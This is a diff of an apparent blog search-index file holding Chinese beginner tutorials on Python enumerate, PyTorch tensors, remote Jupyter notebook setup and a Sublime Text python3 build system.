+<h3 id="6-for循环"><a href="#6-for循环" class="headerlink" title="6. for循环"></a>6. for循环</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">	ans = <span class="hljs-string">''</span></span><br><span class="line">	max_index = len(s) - <span class="hljs-number">1</span></span><br><span class="line">	<span class="hljs-keyword">for</span> index, value <span class="hljs-keyword">in</span> enumerate(s):</span><br><span class="line">		ans += s[max_index-index]</span><br><span class="line">	<span class="hljs-keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure><br>简单学习一下<code>enumerate</code>，它是python中的内置函数，适用于python2.x和python3.x<br><code>enumerate</code>在字典里是枚举、列举的意思<br><code>enumerate</code>参数为可遍历/可迭代的对象（如列表、字符串等）<br>例如：<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> index, value <span class="hljs-keyword">in</span> enumerate(l):</span><br><span class="line"><span class="hljs-meta">... </span>    print(<span class="hljs-string">'%s, %s'</span> % (index, value))</span><br><span class="line">...</span><br><span class="line"><span class="hljs-number">0</span>, <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-number">1</span>, <span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-number">2</span>, <span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-number">3</span>, <span class="hljs-number">4</span></span><br><span class="line"><span class="hljs-number">4</span>, <span class="hljs-number">5</span></span><br><span class="line"><span class="hljs-number">5</span>, <span class="hljs-number">6</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p>
+<hr>
+<p>转自<a href="https://www.cnblogs.com/taceywong/p/8045127.html" target="_blank" rel="noopener">https://www.cnblogs.com/taceywong/p/8045127.html</a></p>
+]]></content>
+      <categories>
+        <category>Daily Essays</category>
+      </categories>
+  </entry>
+  <entry>
     <title>面向和我一样小白的Pytorch教程（待更新）</title>
     <url>/2020/05/28/pytorch-tutorial/</url>
     <content><![CDATA[<p>经过一次本科毕业设计的洗礼，让我逐渐从一个对Deep Learning一无所知的骚年变成一个准备入门的炼丹小白。回顾这几个月（虽然大部分时间都在划水），想做什么都是在谷歌百度，也很难找到一个完全适合我这种小白的Pytorch教程，网上的资料要么过时要么繁琐，最好的学习方式大概是官方的教程，但谁会看得进去呢？所以，我想把我这些日子的经历记录下来，如果有和我一样小白的同学们可以用来参考一下。<a id="more"></a><br>看完这个教程，你会基本学会如何使用Pytorch进行初级水平的搭积木。让我们开始吧！</p>
-<h3 id="一、Install"><a href="#一、Install" class="headerlink" title="一、Install"></a>一、Install</h3><p>第一步，当然是要安装Pytorch啦，请移步<a href="https://pytorch.org/get-started/locally/" target="_blank" rel="noopener">官网</a>，里面有给出具体的安装命令，包括conda以及pip的安装方式。当然这里强烈建议使用Anaconda，Anaconda配置教程详见<a href="https://fansblog.club/2019/12/03/anaconda-installformac/">这里</a>。选择你机器的配置之后复制命令即可，如图所示：<br><img src="/2020/05/28/pytorch-tutorial/pytorch_install.png" alt="pytorch_install.png"></p>
+<h3 id="一、Install"><a href="#一、Install" class="headerlink" title="一、Install"></a>一、Install</h3><p>第一步，当然是要安装Pytorch啦，请移步<a href="https://pytorch.org/get-started/locally/" target="_blank" rel="noopener">官网</a>，里面有给出具体的安装命令，包括conda以及pip的安装方式。当然这里强烈建议使用Anaconda，Anaconda配置教程详见<a href="https://fansblog.club/2019/12/03/anaconda-installformac/" target="_blank" rel="noopener">这里</a>。选择你机器的配置之后复制命令即可，如图所示：<br><img src="/2020/05/28/pytorch-tutorial/pytorch_install.png" alt="pytorch_install.png"></p>
 <h3 id="二、Tensor"><a href="#二、Tensor" class="headerlink" title="二、Tensor"></a>二、Tensor</h3><p>要开始介绍Pytorch之前，我们首先要知道它的计算的基本单位是什么，没错就是Tensor——张量，Tensor比较类似Numpy中的array，比如标量可以理解为0维Tensor，向量可以理解为1维Tensor，矩阵可以理解为2维Tensor，但二者又不完全相同，因为Tensor还附有更多的属性。它有哪些属性呢？让我们来看一下。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> torch</span><br><span class="line">tensor_a = torch.randn(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>)</span><br><span class="line">print(len(dir(tensor_a)))</span><br><span class="line"><span class="hljs-comment"># 479</span></span><br></pre></td></tr></table></figure><br>哇，它竟然有这么多的方法或属性，那我们列举几个比较常用的吧。</p>
 <h4 id="1-About-Tensor’s-Attribute"><a href="#1-About-Tensor’s-Attribute" class="headerlink" title="1. About Tensor’s Attribute"></a>1. About Tensor’s Attribute</h4><ul>
 <li><p>Tensor.requires_grad<br>首先第一个<code>requires_grad</code>，是我认为最重要的，它可是Tensor区别于Numpy的灵魂所在，没有了它，怎么知道这个这个Tensor需不需要求导数呢？当我们创建Tensor的时候，它是默认为False的，但如果我们新建一个网络的时候，它的默认值就是True了。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">tensor_a = torch.randn(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>)</span><br><span class="line">print(tensor_a.requires_grad)</span><br><span class="line"><span class="hljs-comment"># False</span></span><br><span class="line">tensor_b = torch.randn(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>, requires_grad=<span class="hljs-literal">True</span>)</span><br><span class="line">print(tensor_b.requires_grad)</span><br><span class="line"><span class="hljs-comment"># True</span></span><br><span class="line">embed = torch.nn.Embedding(<span class="hljs-number">5</span>, <span class="hljs-number">10</span>)</span><br><span class="line">print(embed.weight.requires_grad)</span><br><span class="line"><span class="hljs-comment"># True</span></span><br></pre></td></tr></table></figure><br>如果你看过有关Pytorch的代码，你可能会发现有个叫Variable的东西，在0.4版本之前，对Tensor，都会用Variable一裹，但现在没必要这么做了，现在的Tensor已经和Variable等价了，所以忘掉Variable吧。</p>
@@ -753,6 +764,26 @@
 <h4 id="3-修改配置文件"><a href="#3-修改配置文件" class="headerlink" title="3. 修改配置文件"></a>3. 修改配置文件</h4><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">c.NotebookApp.ip=<span class="hljs-string">'*'</span>    <span class="hljs-comment">#允许访问的IP地址，设置为*代表允许任何客户端访问</span></span><br><span class="line">c.NotebookApp.password = <span class="hljs-string">u'sha1:8d...'</span><span class="hljs-comment">#		刚才生成密码时复制的密文</span></span><br><span class="line">c.NotebookApp.open_browser = <span class="hljs-literal">False</span>    <span class="hljs-comment">#True的话会自动弹出窗口</span></span><br><span class="line">c.NotebookApp.port = <span class="hljs-number">5555</span>  <span class="hljs-comment">#可自行指定一个端口, 访问时使用该端口</span></span><br><span class="line">c.NotebookApp.allow_remote_access = <span class="hljs-literal">True</span>   <span class="hljs-comment">#这个一定得设置，不然会报错</span></span><br></pre></td></tr></table></figure><br>别忘了保存。<br>哦，如果你是国内的服务器厂商诸如腾讯云、阿里云之类的，还需要添加一下安全组规则。</p>
 <h3 id="三、远程访问"><a href="#三、远程访问" class="headerlink" title="三、远程访问"></a>三、远程访问</h3><p>在服务器输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">jupyter notebook</span><br></pre></td></tr></table></figure><br>就可以开启<code>jupyter notebook</code>进程了<br>如果访问的是/root目录，还需要root权限<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">jupyter notebook --allow-root</span><br></pre></td></tr></table></figure><br>之后就可以在本地浏览器输入<code>ip:port</code>实现远程访问<code>jupyter notebook</code>了<br>（第一次访问会输入密码。）</p>
 <h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>我们可以使用<code>screen</code>命令实现<code>jupyter notebook</code>后台运行，这样我们去用服务器干别的事情啦。<br>输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">screen -S process_name</span><br></pre></td></tr></table></figure><br>之后运行<code>jupyter notebook</code>就可以了，返回键为<code>ctrl</code> + <code>A</code> + <code>D</code><br>显示后台程序输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">screen -r process_name</span><br></pre></td></tr></table></figure><br>如果服务器没有<code>screen</code>命令请安装<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">apt install screen</span><br></pre></td></tr></table></figure></p>
+]]></content>
+      <categories>
+        <category>Daily Essays</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Sublime中按ctrl+B调用python3运行</title>
+    <url>/2019/07/23/sublime-run/</url>
+    <content><![CDATA[<p>前些天用python写了一个小程序，但放在sublime里直接ctrl+B运行不了，提示没有什么什么包…思前想后，觉得sublime的ctrl+B快捷键默认使用的是电脑里的python2吧<a id="more"></a>，而我是用pip3 install的包，肯定会报错了，那现在解决办法一定是要让sublime知道我的python3放在哪里，根据python3的路径去用python3执行代码。</p>
+<p>解决办法如下：</p>
+<h5 id="1-首先新建一个sublime-build-system"><a href="#1-首先新建一个sublime-build-system" class="headerlink" title="1. 首先新建一个sublime build system"></a>1. 首先新建一个sublime build system</h5><p>   Tools-&gt;Build System-&gt;New Build System…</p>
+<p>   <img src="/2019/07/23/sublime-run/sublime_run1.png" alt="sublime_run1"></p>
+<h5 id="2-在里面输入以下内容："><a href="#2-在里面输入以下内容：" class="headerlink" title="2. 在里面输入以下内容："></a>2. 在里面输入以下内容：</h5><p>   <figure class="highlight json hljs"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="hljs-attr">"env"</span>: &#123;<span class="hljs-attr">"PYTHONIOENCODING"</span>: <span class="hljs-string">"utf8"</span>&#125;,</span><br><span class="line">    <span class="hljs-attr">"cmd"</span>: [<span class="hljs-string">"/Library/Frameworks/Python.framework/Versions/3.6/bin/python3"</span>, <span class="hljs-string">"-u"</span>, <span class="hljs-string">"$file"</span>],</span><br><span class="line">    <span class="hljs-attr">"file_regex"</span>: <span class="hljs-string">"^[ ]*File \"(...*?)\", line ([0-9]*)"</span>,</span><br><span class="line">    <span class="hljs-attr">"selector"</span>: <span class="hljs-string">"source.python"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>   <code>&quot;env&quot;: {“PYTHONIOENCODING”: “utf8”}</code>的作用是为了避免中文报错。</p>
+<p>   <code>[&quot;/Library/Frameworks/Python.framework/Versions/3.6/bin/python3&quot;, &quot;-u&quot;, &quot;$file&quot;]</code>这里的路径替换成python3的路径。</p>
+<p>   如果你不知道python3的路径在哪里，mac os请在终端输入which python3查看:</p>
+<p>   <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">which</span> python3</span><br></pre></td></tr></table></figure></p>
+<p>   比如我的路径是<code>/usr/local/bin/python3</code>，就将该路径复制过去。</p>
+<p>   然后保存文件名为<strong>python3.sublime-build</strong></p>
+<p>   最后，选择python3: Tools-&gt;Build System-&gt;python3</p>
 ]]></content>
       <categories>
         <category>Daily Essays</category>
@@ -795,26 +826,6 @@
 <li><p>Win<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">ipconfig/flushdns</span><br></pre></td></tr></table></figure></p>
 </li>
 </ul>
-]]></content>
-      <categories>
-        <category>Daily Essays</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Sublime中按ctrl+B调用python3运行</title>
-    <url>/2019/07/23/sublime-run/</url>
-    <content><![CDATA[<p>前些天用python写了一个小程序，但放在sublime里直接ctrl+B运行不了，提示没有什么什么包…思前想后，觉得sublime的ctrl+B快捷键默认使用的是电脑里的python2吧<a id="more"></a>，而我是用pip3 install的包，肯定会报错了，那现在解决办法一定是要让sublime知道我的python3放在哪里，根据python3的路径去用python3执行代码。</p>
-<p>解决办法如下：</p>
-<h5 id="1-首先新建一个sublime-build-system"><a href="#1-首先新建一个sublime-build-system" class="headerlink" title="1. 首先新建一个sublime build system"></a>1. 首先新建一个sublime build system</h5><p>   Tools-&gt;Build System-&gt;New Build System…</p>
-<p>   <img src="/2019/07/23/sublime-run/sublime_run1.png" alt="sublime_run1"></p>
-<h5 id="2-在里面输入以下内容："><a href="#2-在里面输入以下内容：" class="headerlink" title="2. 在里面输入以下内容："></a>2. 在里面输入以下内容：</h5><p>   <figure class="highlight json hljs"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="hljs-attr">"env"</span>: &#123;<span class="hljs-attr">"PYTHONIOENCODING"</span>: <span class="hljs-string">"utf8"</span>&#125;,</span><br><span class="line">    <span class="hljs-attr">"cmd"</span>: [<span class="hljs-string">"/Library/Frameworks/Python.framework/Versions/3.6/bin/python3"</span>, <span class="hljs-string">"-u"</span>, <span class="hljs-string">"$file"</span>],</span><br><span class="line">    <span class="hljs-attr">"file_regex"</span>: <span class="hljs-string">"^[ ]*File \"(...*?)\", line ([0-9]*)"</span>,</span><br><span class="line">    <span class="hljs-attr">"selector"</span>: <span class="hljs-string">"source.python"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>   <code>&quot;env&quot;: {“PYTHONIOENCODING”: “utf8”}</code>的作用是为了避免中文报错。</p>
-<p>   <code>[&quot;/Library/Frameworks/Python.framework/Versions/3.6/bin/python3&quot;, &quot;-u&quot;, &quot;$file&quot;]</code>这里的路径替换成python3的路径。</p>
-<p>   如果你不知道python3的路径在哪里，mac os请在终端输入which python3查看:</p>
-<p>   <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">which</span> python3</span><br></pre></td></tr></table></figure></p>
-<p>   比如我的路径是<code>/usr/local/bin/python3</code>，就将该路径复制过去。</p>
-<p>   然后保存文件名为<strong>python3.sublime-build</strong></p>
-<p>   最后，选择python3: Tools-&gt;Build System-&gt;python3</p>
 ]]></content>
       <categories>
         <category>Daily Essays</category>
